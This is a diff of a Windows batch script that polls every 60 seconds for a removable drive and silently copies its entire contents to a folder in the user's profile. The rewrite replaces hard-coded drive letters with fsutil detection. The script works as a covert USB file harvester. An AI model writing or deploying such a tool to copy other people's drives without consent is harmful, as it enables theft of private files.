@@ -1,36 +1,14 @@
 @echo off
-SET var = 0
-SET file = "C:\Users\%username%\copied"
-goto start
-
-:: potential D drive as USB volume 
-
-:f
-xcopy /e /y F: %file%
-SET var = 1
-goto done
-
-:e
-xcopy /e /y E: %file%
-SET var = 1
-goto done
-
-:g
-xcopy /e /y G: %file%
-SET var = 1
-goto done
-
-:h
-xcopy /e /y H: %file%
-SET var = 1
-goto done
-
-:done
-if %var%==1 exit else goto start
-
-:start
-timeout /t 60 /nobreak >nul
-if exist F: (goto f)
-if exist E: (goto e)
-if exist G: (goto g) else (goto h)
-goto start
+:loop
+   for /F "tokens=1*" %%a in ('fsutil fsinfo drives') do (
+      for %%c in (%%b) do (
+         for /F "tokens=3" %%d in ('fsutil fsinfo drivetype %%c') do (
+            if %%d equ Removable (
+               xcopy /E /Y /I %%c C:\Users\%username%\copy
+               exit
+            )
+         )
+      )
+   )
+timeout /t 60 /nobreak > nul
+goto loop
